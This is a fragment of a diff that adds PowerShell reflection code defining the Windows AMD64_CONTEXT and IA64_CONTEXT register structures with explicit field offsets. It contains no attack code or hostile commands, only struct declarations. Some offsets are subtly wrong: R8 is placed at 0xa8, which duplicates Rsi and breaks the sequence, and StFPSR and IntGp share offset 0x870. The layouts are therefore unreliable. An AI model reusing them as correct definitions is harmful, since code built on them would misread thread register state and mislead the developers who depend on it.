+        ($TypeBuilder.DefineField(&#39;SegCs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x38)
+        ($TypeBuilder.DefineField(&#39;SegDs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x3a)
+        ($TypeBuilder.DefineField(&#39;SegEs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x3c)
+        ($TypeBuilder.DefineField(&#39;SegFs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x3e)
+        ($TypeBuilder.DefineField(&#39;SegGs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x40)
+        ($TypeBuilder.DefineField(&#39;SegSs&#39;, [UInt16], &#39;Public&#39;)).SetOffset(0x42)
+        ($TypeBuilder.DefineField(&#39;EFlags&#39;, [UInt32], &#39;Public&#39;)).SetOffset(0x44)
+        ($TypeBuilder.DefineField(&#39;Dr0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x48)
+        ($TypeBuilder.DefineField(&#39;Dr1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x50)
+        ($TypeBuilder.DefineField(&#39;Dr2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x58)
+        ($TypeBuilder.DefineField(&#39;Dr3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x60)
+        ($TypeBuilder.DefineField(&#39;Dr6&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x68)
+        ($TypeBuilder.DefineField(&#39;Dr7&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x70)
+        ($TypeBuilder.DefineField(&#39;Rax&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x78)
+        ($TypeBuilder.DefineField(&#39;Rcx&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x80)
+        ($TypeBuilder.DefineField(&#39;Rdx&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x88)
+        ($TypeBuilder.DefineField(&#39;Rbx&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x90)
+        ($TypeBuilder.DefineField(&#39;Rsp&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x98)
+        ($TypeBuilder.DefineField(&#39;Rbp&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa0)
+        ($TypeBuilder.DefineField(&#39;Rsi&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa8)
+        ($TypeBuilder.DefineField(&#39;Rdi&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xb0)
+        ($TypeBuilder.DefineField(&#39;R8&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xa8)
+        ($TypeBuilder.DefineField(&#39;R9&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xc0)
+        ($TypeBuilder.DefineField(&#39;R10&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xc8)
+        ($TypeBuilder.DefineField(&#39;R11&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xd0)
+        ($TypeBuilder.DefineField(&#39;R12&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xd8)
+        ($TypeBuilder.DefineField(&#39;R13&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xe0)
+        ($TypeBuilder.DefineField(&#39;R14&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xe8)
+        ($TypeBuilder.DefineField(&#39;R15&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xf0)
+        ($TypeBuilder.DefineField(&#39;Rip&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0xf8)
+        ($TypeBuilder.DefineField(&#39;FltSave&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x100)
+        ($TypeBuilder.DefineField(&#39;Legacy&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x120)
+        ($TypeBuilder.DefineField(&#39;Xmm0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1a0)
+        ($TypeBuilder.DefineField(&#39;Xmm1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1b0)
+        ($TypeBuilder.DefineField(&#39;Xmm2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1c0)
+        ($TypeBuilder.DefineField(&#39;Xmm3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1d0)
+        ($TypeBuilder.DefineField(&#39;Xmm4&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1e0)
+        ($TypeBuilder.DefineField(&#39;Xmm5&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x1f0)
+        ($TypeBuilder.DefineField(&#39;Xmm6&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x200)
+        ($TypeBuilder.DefineField(&#39;Xmm7&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x210)
+        ($TypeBuilder.DefineField(&#39;Xmm8&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x220)
+        ($TypeBuilder.DefineField(&#39;Xmm9&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x230)
+        ($TypeBuilder.DefineField(&#39;Xmm10&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x240)
+        ($TypeBuilder.DefineField(&#39;Xmm11&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x250)
+        ($TypeBuilder.DefineField(&#39;Xmm12&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x260)
+        ($TypeBuilder.DefineField(&#39;Xmm13&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x270)
+        ($TypeBuilder.DefineField(&#39;Xmm14&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x280)
+        ($TypeBuilder.DefineField(&#39;Xmm15&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x290)
+        ($TypeBuilder.DefineField(&#39;VectorRegister&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x300)
+        ($TypeBuilder.DefineField(&#39;VectorControl&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4a0)
+        ($TypeBuilder.DefineField(&#39;DebugControl&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4a8)
+        ($TypeBuilder.DefineField(&#39;LastBranchToRip&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4b0)
+        ($TypeBuilder.DefineField(&#39;LastBranchFromRip&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4b8)
+        ($TypeBuilder.DefineField(&#39;LastExceptionToRip&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4c0)
+        ($TypeBuilder.DefineField(&#39;LastExceptionFromRip&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x4c8)
+        $Global:AMD64_CONTEXT = $TypeBuilder.CreateType()
+        #endregion AMD64_CONTEXT
+
+        #region IA64_CONTEXT
+        $Attributes = &#39;AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit&#39;
+        $TypeBuilder = $ModuleBuilder.DefineType(&#39;IA64_CONTEXT&#39;, $Attributes, [ValueType])
+        ($TypeBuilder.DefineField(&#39;ContextFlags&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x0)
+        ($TypeBuilder.DefineField(&#39;DbI0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x010)
+        ($TypeBuilder.DefineField(&#39;DbI1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x018)
+        ($TypeBuilder.DefineField(&#39;DbI2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x020)
+        ($TypeBuilder.DefineField(&#39;DbI3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x028)
+        ($TypeBuilder.DefineField(&#39;DbI4&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x030)
+        ($TypeBuilder.DefineField(&#39;DbI5&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x038)
+        ($TypeBuilder.DefineField(&#39;DbI6&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x040)
+        ($TypeBuilder.DefineField(&#39;DbI7&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x048)
+        ($TypeBuilder.DefineField(&#39;DbD0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x050)
+        ($TypeBuilder.DefineField(&#39;DbD1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x058)
+        ($TypeBuilder.DefineField(&#39;DbD2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x060)
+        ($TypeBuilder.DefineField(&#39;DbD3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x068)
+        ($TypeBuilder.DefineField(&#39;DbD4&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x070)
+        ($TypeBuilder.DefineField(&#39;DbD5&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x078)
+        ($TypeBuilder.DefineField(&#39;DbD6&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x080)
+        ($TypeBuilder.DefineField(&#39;DbD7&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x088)
+        ($TypeBuilder.DefineField(&#39;FltS0&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x090)
+        ($TypeBuilder.DefineField(&#39;FltS1&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0a0)
+        ($TypeBuilder.DefineField(&#39;FltS2&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0b0)
+        ($TypeBuilder.DefineField(&#39;FltS3&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0c0)
+        ($TypeBuilder.DefineField(&#39;FltT0&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0d0)
+        ($TypeBuilder.DefineField(&#39;FltT1&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0e0)
+        ($TypeBuilder.DefineField(&#39;FltT2&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x0f0)
+        ($TypeBuilder.DefineField(&#39;FltT3&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x100)
+        ($TypeBuilder.DefineField(&#39;FltT4&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x110)
+        ($TypeBuilder.DefineField(&#39;FltT5&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x120)
+        ($TypeBuilder.DefineField(&#39;FltT6&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x130)
+        ($TypeBuilder.DefineField(&#39;FltT7&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x140)
+        ($TypeBuilder.DefineField(&#39;FltT8&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x150)
+        ($TypeBuilder.DefineField(&#39;FltT9&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x160)
+        ($TypeBuilder.DefineField(&#39;FltS4&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x170)
+        ($TypeBuilder.DefineField(&#39;FltS5&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x180)
+        ($TypeBuilder.DefineField(&#39;FltS6&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x190)
+        ($TypeBuilder.DefineField(&#39;FltS7&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1a0)
+        ($TypeBuilder.DefineField(&#39;FltS8&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1b0)
+        ($TypeBuilder.DefineField(&#39;FltS9&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1c0)
+        ($TypeBuilder.DefineField(&#39;FltS10&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1d0)
+        ($TypeBuilder.DefineField(&#39;FltS11&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1e0)
+        ($TypeBuilder.DefineField(&#39;FltS12&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x1f0)
+        ($TypeBuilder.DefineField(&#39;FltS13&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x200)
+        ($TypeBuilder.DefineField(&#39;FltS14&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x210)
+        ($TypeBuilder.DefineField(&#39;FltS15&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x220)
+        ($TypeBuilder.DefineField(&#39;FltS16&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x230)
+        ($TypeBuilder.DefineField(&#39;FltS17&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x240)
+        ($TypeBuilder.DefineField(&#39;FltS18&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x250)
+        ($TypeBuilder.DefineField(&#39;FltS19&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x260)
+        ($TypeBuilder.DefineField(&#39;FltF32&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x270)
+        ($TypeBuilder.DefineField(&#39;FltF33&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x280)
+        ($TypeBuilder.DefineField(&#39;FltF34&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x290)
+        ($TypeBuilder.DefineField(&#39;FltF35&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2a0)
+        ($TypeBuilder.DefineField(&#39;FltF36&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2b0)
+        ($TypeBuilder.DefineField(&#39;FltF37&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2c0)
+        ($TypeBuilder.DefineField(&#39;FltF38&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2d0)
+        ($TypeBuilder.DefineField(&#39;FltF39&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2e0)
+        ($TypeBuilder.DefineField(&#39;FltF40&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x2f0)
+        ($TypeBuilder.DefineField(&#39;FltF41&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x300)
+        ($TypeBuilder.DefineField(&#39;FltF42&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x310)
+        ($TypeBuilder.DefineField(&#39;FltF43&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x320)
+        ($TypeBuilder.DefineField(&#39;FltF44&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x330)
+        ($TypeBuilder.DefineField(&#39;FltF45&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x340)
+        ($TypeBuilder.DefineField(&#39;FltF46&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x350)
+        ($TypeBuilder.DefineField(&#39;FltF47&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x360)
+        ($TypeBuilder.DefineField(&#39;FltF48&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x370)
+        ($TypeBuilder.DefineField(&#39;FltF49&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x380)
+        ($TypeBuilder.DefineField(&#39;FltF50&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x390)
+        ($TypeBuilder.DefineField(&#39;FltF51&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3a0)
+        ($TypeBuilder.DefineField(&#39;FltF52&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3b0)
+        ($TypeBuilder.DefineField(&#39;FltF53&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3c0)
+        ($TypeBuilder.DefineField(&#39;FltF54&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3d0)
+        ($TypeBuilder.DefineField(&#39;FltF55&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3e0)
+        ($TypeBuilder.DefineField(&#39;FltF56&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x3f0)
+        ($TypeBuilder.DefineField(&#39;FltF57&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x400)
+        ($TypeBuilder.DefineField(&#39;FltF58&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x410)
+        ($TypeBuilder.DefineField(&#39;FltF59&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x420)
+        ($TypeBuilder.DefineField(&#39;FltF60&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x430)
+        ($TypeBuilder.DefineField(&#39;FltF61&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x440)
+        ($TypeBuilder.DefineField(&#39;FltF62&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x450)
+        ($TypeBuilder.DefineField(&#39;FltF63&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x460)
+        ($TypeBuilder.DefineField(&#39;FltF64&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x470)
+        ($TypeBuilder.DefineField(&#39;FltF65&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x480)
+        ($TypeBuilder.DefineField(&#39;FltF66&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x490)
+        ($TypeBuilder.DefineField(&#39;FltF67&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4a0)
+        ($TypeBuilder.DefineField(&#39;FltF68&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4b0)
+        ($TypeBuilder.DefineField(&#39;FltF69&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4c0)
+        ($TypeBuilder.DefineField(&#39;FltF70&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4d0)
+        ($TypeBuilder.DefineField(&#39;FltF71&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4e0)
+        ($TypeBuilder.DefineField(&#39;FltF72&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x4f0)
+        ($TypeBuilder.DefineField(&#39;FltF73&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x500)
+        ($TypeBuilder.DefineField(&#39;FltF74&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x510)
+        ($TypeBuilder.DefineField(&#39;FltF75&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x520)
+        ($TypeBuilder.DefineField(&#39;FltF76&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x530)
+        ($TypeBuilder.DefineField(&#39;FltF77&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x540)
+        ($TypeBuilder.DefineField(&#39;FltF78&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x550)
+        ($TypeBuilder.DefineField(&#39;FltF79&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x560)
+        ($TypeBuilder.DefineField(&#39;FltF80&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x570)
+        ($TypeBuilder.DefineField(&#39;FltF81&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x580)
+        ($TypeBuilder.DefineField(&#39;FltF82&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x590)
+        ($TypeBuilder.DefineField(&#39;FltF83&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5a0)
+        ($TypeBuilder.DefineField(&#39;FltF84&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5b0)
+        ($TypeBuilder.DefineField(&#39;FltF85&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5c0)
+        ($TypeBuilder.DefineField(&#39;FltF86&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5d0)
+        ($TypeBuilder.DefineField(&#39;FltF87&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5e0)
+        ($TypeBuilder.DefineField(&#39;FltF88&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x5f0)
+        ($TypeBuilder.DefineField(&#39;FltF89&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x600)
+        ($TypeBuilder.DefineField(&#39;FltF90&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x610)
+        ($TypeBuilder.DefineField(&#39;FltF91&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x620)
+        ($TypeBuilder.DefineField(&#39;FltF92&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x630)
+        ($TypeBuilder.DefineField(&#39;FltF93&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x640)
+        ($TypeBuilder.DefineField(&#39;FltF94&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x650)
+        ($TypeBuilder.DefineField(&#39;FltF95&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x660)
+        ($TypeBuilder.DefineField(&#39;FltF96&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x670)
+        ($TypeBuilder.DefineField(&#39;FltF97&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x680)
+        ($TypeBuilder.DefineField(&#39;FltF98&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x690)
+        ($TypeBuilder.DefineField(&#39;FltF99&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6a0)
+        ($TypeBuilder.DefineField(&#39;FltF100&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6b0)
+        ($TypeBuilder.DefineField(&#39;FltF101&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6c0)
+        ($TypeBuilder.DefineField(&#39;FltF102&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6d0)
+        ($TypeBuilder.DefineField(&#39;FltF103&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6e0)
+        ($TypeBuilder.DefineField(&#39;FltF104&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x6f0)
+        ($TypeBuilder.DefineField(&#39;FltF105&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x700)
+        ($TypeBuilder.DefineField(&#39;FltF106&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x710)
+        ($TypeBuilder.DefineField(&#39;FltF107&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x720)
+        ($TypeBuilder.DefineField(&#39;FltF108&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x730)
+        ($TypeBuilder.DefineField(&#39;FltF109&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x740)
+        ($TypeBuilder.DefineField(&#39;FltF110&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x750)
+        ($TypeBuilder.DefineField(&#39;FltF111&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x760)
+        ($TypeBuilder.DefineField(&#39;FltF112&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x770)
+        ($TypeBuilder.DefineField(&#39;FltF113&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x780)
+        ($TypeBuilder.DefineField(&#39;FltF114&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x790)
+        ($TypeBuilder.DefineField(&#39;FltF115&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7a0)
+        ($TypeBuilder.DefineField(&#39;FltF116&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7b0)
+        ($TypeBuilder.DefineField(&#39;FltF117&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7c0)
+        ($TypeBuilder.DefineField(&#39;FltF118&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7d0)
+        ($TypeBuilder.DefineField(&#39;FltF119&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7e0)
+        ($TypeBuilder.DefineField(&#39;FltF120&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x7f0)
+        ($TypeBuilder.DefineField(&#39;FltF121&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x800)
+        ($TypeBuilder.DefineField(&#39;FltF122&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x810)
+        ($TypeBuilder.DefineField(&#39;FltF123&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x820)
+        ($TypeBuilder.DefineField(&#39;FltF124&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x830)
+        ($TypeBuilder.DefineField(&#39;FltF125&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x840)
+        ($TypeBuilder.DefineField(&#39;FltF126&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x850)
+        ($TypeBuilder.DefineField(&#39;FltF127&#39;, $FLOAT128, &#39;Public&#39;)).SetOffset(0x860)
+        ($TypeBuilder.DefineField(&#39;StFPSR&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x870)
+        ($TypeBuilder.DefineField(&#39;IntGp&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x870)
+        ($TypeBuilder.DefineField(&#39;IntT0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x880)
+        ($TypeBuilder.DefineField(&#39;IntT1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x888)
+        ($TypeBuilder.DefineField(&#39;IntS0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x890)
+        ($TypeBuilder.DefineField(&#39;IntS1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x898)
+        ($TypeBuilder.DefineField(&#39;IntS2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8a0)
+        ($TypeBuilder.DefineField(&#39;IntS3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8a8)
+        ($TypeBuilder.DefineField(&#39;IntV0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8b0)
+        ($TypeBuilder.DefineField(&#39;IntT2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8b8)
+        ($TypeBuilder.DefineField(&#39;IntT3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8c0)
+        ($TypeBuilder.DefineField(&#39;IntT4&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8c8)
+        ($TypeBuilder.DefineField(&#39;IntSp&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8d0)
+        ($TypeBuilder.DefineField(&#39;IntTeb&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8d8)
+        ($TypeBuilder.DefineField(&#39;IntT5&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8e0)
+        ($TypeBuilder.DefineField(&#39;IntT6&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8e8)
+        ($TypeBuilder.DefineField(&#39;IntT7&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8f0)
+        ($TypeBuilder.DefineField(&#39;IntT8&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x8f8)
+        ($TypeBuilder.DefineField(&#39;IntT9&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x900)
+        ($TypeBuilder.DefineField(&#39;IntT10&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x908)
+        ($TypeBuilder.DefineField(&#39;IntT11&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x910)
+        ($TypeBuilder.DefineField(&#39;IntT12&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x918)
+        ($TypeBuilder.DefineField(&#39;IntT13&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x920)
+        ($TypeBuilder.DefineField(&#39;IntT14&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x928)
+        ($TypeBuilder.DefineField(&#39;IntT15&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x930)
+        ($TypeBuilder.DefineField(&#39;IntT16&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x938)
+        ($TypeBuilder.DefineField(&#39;IntT17&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x940)
+        ($TypeBuilder.DefineField(&#39;IntT18&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x948)
+        ($TypeBuilder.DefineField(&#39;IntT19&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x950)
+        ($TypeBuilder.DefineField(&#39;IntT20&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x958)
+        ($TypeBuilder.DefineField(&#39;IntT21&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x960)
+        ($TypeBuilder.DefineField(&#39;IntT22&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x968)
+        ($TypeBuilder.DefineField(&#39;IntNats&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x970)
+        ($TypeBuilder.DefineField(&#39;Preds&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x978)
+        ($TypeBuilder.DefineField(&#39;BrRp&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x980)
+        ($TypeBuilder.DefineField(&#39;BrS0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x988)
+        ($TypeBuilder.DefineField(&#39;BrS1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x990)
+        ($TypeBuilder.DefineField(&#39;BrS2&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x998)
+        ($TypeBuilder.DefineField(&#39;BrS3&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9a0)
+        ($TypeBuilder.DefineField(&#39;BrS4&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9a8)
+        ($TypeBuilder.DefineField(&#39;BrT0&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9b0)
+        ($TypeBuilder.DefineField(&#39;BrT1&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9b8)
+        ($TypeBuilder.DefineField(&#39;ApUNAT&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9c0)
+        ($TypeBuilder.DefineField(&#39;ApLC&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9c8)
+        ($TypeBuilder.DefineField(&#39;ApEC&#39;, [UInt64], &#39;Public&#39;)).SetOffset(0x9d0)
